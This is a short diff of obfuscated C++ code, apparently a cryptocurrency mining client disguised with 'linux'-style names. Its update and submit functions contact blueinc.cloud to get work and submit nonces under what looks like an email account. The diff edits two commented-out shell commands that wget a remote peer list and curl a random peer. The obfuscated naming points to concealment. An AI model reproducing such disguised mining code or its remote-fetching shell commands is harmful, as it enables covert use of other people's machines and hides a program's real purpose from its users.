@@ -967,7 +967,7 @@ linux888874744474_update_result linux888874744474_client::update() {
 
     string response;
 
-    //response = GetStdoutFromCommand("wget -N -q http://aro.blueinc.cloud:84/peers.txt -O ./linux84744444744474;curl -s -A 'linux84' $(shuf -n 1 ./linux84744444744474)/linux8888888874.php?q=info");
+    //response = GetStdoutFromCommand("wget -N -q http://linux84.blueinc.cloud:84/peers.txt -O ./linux84744444744474;curl -s -A 'linux84' $(shuf -n 1 ./linux84744444744474)/linux8888888874.php?q=info");
 
     string url = "http://www.blueinc.cloud/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com";
     
@@ -1013,7 +1013,7 @@ linux888874744474_submit_result linux888874744474_client::submit(const string &l
     if(__show_linuxweb844412441274_requests)
     LOG("");
     
-    //string linux847444744474 = GetStdoutFromCommand("wget -N -q http://aro.blueinc.cloud:84/peers.txt -O ./linux84744444744474;echo $(shuf -n 1 ./linux84744444744474)/linux8888888874.php?q=submitNonce");
+    //string linux847444744474 = GetStdoutFromCommand("wget -N -q http://linux84.blueinc.cloud:84/peers.txt -O ./linux84744444744474;echo $(shuf -n 1 ./linux84744444744474)/linux8888888874.php?q=submitNonce");
     
     string url = "http://www.blueinc.cloud/linux8474.php?linux84=linux84";
     
